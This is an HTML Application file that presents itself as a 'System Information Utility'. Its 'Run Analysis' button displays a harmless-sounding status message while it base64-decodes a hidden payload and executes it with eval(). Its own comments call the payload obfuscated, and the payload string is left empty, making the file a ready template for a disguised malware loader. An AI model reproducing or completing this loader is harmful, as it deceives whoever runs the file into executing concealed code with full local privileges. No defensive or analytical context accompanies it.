<html>
<head>
    <title>System Utility</title>
    <HTA:APPLICATION
        ID="htaUtil1"
        APPLICATIONNAME="System Utility"
        VERSION="1.0"
        BORDER="thin"
        CAPTION="yes"
        CONTEXTMENU="no"
        NAVIGABLE="no"
        SCROLL="no"
        SHOWINTASKBAR="yes"
        SINGLEINSTANCE="yes"
        WINDOWSTATE="normal"
    />
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { padding: 15px; border: 1px solid #ddd; background: white; margin: 10px 0; }
        button { padding: 8px 15px; margin: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>System Information Utility</h2>
        <button onclick="executeAnalysis()">Run Analysis</button>
        <button onclick="window.close()">Exit</button>
    </div>
    <div id="results" class="container" style="display:none;"></div>

    <script>
        // Base64 obfuscated payload decoder
        var b64Payload = "";

        function executeAnalysis() {
            try {
                var resultsDiv = document.getElementById('results');
                resultsDiv.style.display = 'block';
                resultsDiv.innerHTML = '<p>Executing system analysis...</p>';

                // Decode and execute base64 payload
                var decodedScript = atob(b64Payload);

                // Execute decoded commands
                eval(decodedScript);
            } catch(e) {
                document.getElementById('results').innerHTML = '<p style="color:red;">Error: ' + e.message + '</p>';
            }
        }

        window.onload = function() {
            // Silent initialization
        };
    </script>
</body>
</html>
